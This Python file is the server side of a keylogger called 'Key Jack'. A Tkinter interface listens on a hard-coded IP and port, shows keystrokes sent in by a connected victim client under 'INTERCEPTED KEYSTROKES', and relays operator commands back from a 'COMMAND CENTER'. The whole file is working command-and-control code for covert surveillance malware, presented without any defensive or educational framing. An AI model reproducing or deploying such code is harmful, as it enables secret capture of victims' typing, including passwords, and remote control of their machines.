import socket
import threading
import tkinter as tk
from tkinter import filedialog, font
import os


class KeyJackServer:
    def __init__(self):
        self.file = None
        self.connected_client = None
        self.server_socket = None
        self.setup_gui()
        self.setup_network()
        self.root.mainloop()

    def setup_gui(self):
        self.root = tk.Tk()
        self.root.title("Key Jack")
        self.root.geometry("800x600")
        self.root.configure(bg='#001933')  # Dark blue background

        self.cyber_font = font.Font(family="Courier", size=12, weight="bold")

        self.create_widgets()
        self.root.protocol("WM_DELETE_WINDOW", self.on_closing)

    def create_widgets(self):
        # Title
        title_label = tk.Label(self.root, text="< KEY JACK >", font=("Courier", 24, "bold"),
                               bg='#001933', fg='#00FF00')
        title_label.pack(pady=20)

        # File selection
        self.select_button = tk.Button(self.root, text="SELECT TARGET FILE", command=self.select_file,
                                       bg='#00FF00', fg='#000000', font=self.cyber_font)
        self.select_button.pack(pady=10)

        self.file_label = tk.Label(self.root, text="No file selected", bg='#001933', fg='#00FF00', font=self.cyber_font)
        self.file_label.pack(pady=5)

        # Text areas
        text_frame = tk.Frame(self.root, bg='#001933')
        text_frame.pack(fill=tk.BOTH, expand=True, padx=20, pady=20)

        self.create_text_area(text_frame, "INTERCEPTED KEYSTROKES", 0)
        self.create_text_area(text_frame, "COMMAND CENTER", 1)

        # Execute button
        self.execute_button = tk.Button(self.root, text="EXECUTE COMMAND", command=self.handle_sending,
                                        bg='#00FF00', fg='#000000', font=self.cyber_font)
        self.execute_button.pack(pady=10)

        # Status
        self.status_label = tk.Label(self.root, text="STATUS: DISCONNECTED", bg='#001933', fg='#FF0000',
                                     font=self.cyber_font)
        self.status_label.pack(pady=5)

        # System ready label
        self.system_label = tk.Label(self.root, text="[ SYSTEM READY ]", bg='#001933', fg='#00FF00',
                                     font=self.cyber_font)
        self.system_label.pack(pady=5)

    def create_text_area(self, parent, title, column):
        frame = tk.Frame(parent, bg='#001933')
        frame.grid(row=0, column=column, sticky="nsew", padx=10)
        parent.grid_columnconfigure(column, weight=1)

        label = tk.Label(frame, text=title, bg='#001933', fg='#00FF00', font=self.cyber_font)
        label.pack()

        text_area = tk.Text(frame, height=15, width=40, bg='#000000', fg='#00FF00', font=self.cyber_font)
        text_area.pack(fill=tk.BOTH, expand=True)

        setattr(self, f"{title.lower().replace(' ', '_')}_area", text_area)

    def select_file(self):
        file_path = filedialog.askopenfilename()
        if file_path:
            self.file = file_path
            self.file_label.config(text=f"Selected: {os.path.basename(file_path)}")

    def handle_sending(self):
        if self.file:
            command = self.command_center_area.get("1.0", tk.END).strip()
            if command:
                self.send_message_to_client(command)
            else:
                self.update_command_center("No command entered.")
        else:
            self.update_command_center("No target file selected.")

    def setup_network(self):
        self.server_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        self.server_socket.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
        self.server_socket.bind(('172.20.10.5', 10319))
        self.server_socket.listen(1)

        threading.Thread(target=self.accept_connections, daemon=True).start()

    def accept_connections(self):
        while True:
            client_socket, addr = self.server_socket.accept()
            self.connected_client = client_socket
            self.update_status("CONNECTED")
            threading.Thread(target=self.handle_client, args=(client_socket,), daemon=True).start()

    def handle_client(self, client_socket):
        while True:
            try:
                data = client_socket.recv(1024).decode('utf-8')
                if not data:
                    break
                self.update_intercepted_keystrokes(data)
            except:
                break
        self.connected_client = None
        self.update_status("DISCONNECTED")

    def send_message_to_client(self, message):
        if self.connected_client:
            try:
                self.connected_client.send(message.encode('utf-8'))
                self.update_command_center(f"Sent: {message}")
            except:
                self.update_command_center("Failed to send message.")
        else:
            self.update_command_center("No client connected.")

    def update_intercepted_keystrokes(self, message):
        self.intercepted_keystrokes_area.insert(tk.END, message)
        self.intercepted_keystrokes_area.see(tk.END)

    def update_command_center(self, message):
        self.command_center_area.insert(tk.END, message + "\n")
        self.command_center_area.see(tk.END)

    def update_status(self, status):
        self.status_label.config(text=f"STATUS: {status}", fg='#00FF00' if status == 'CONNECTED' else '#FF0000')

    def on_closing(self):
        if self.server_socket:
            self.server_socket.close()
        self.root.destroy()


if __name__ == "__main__":
    KeyJackServer()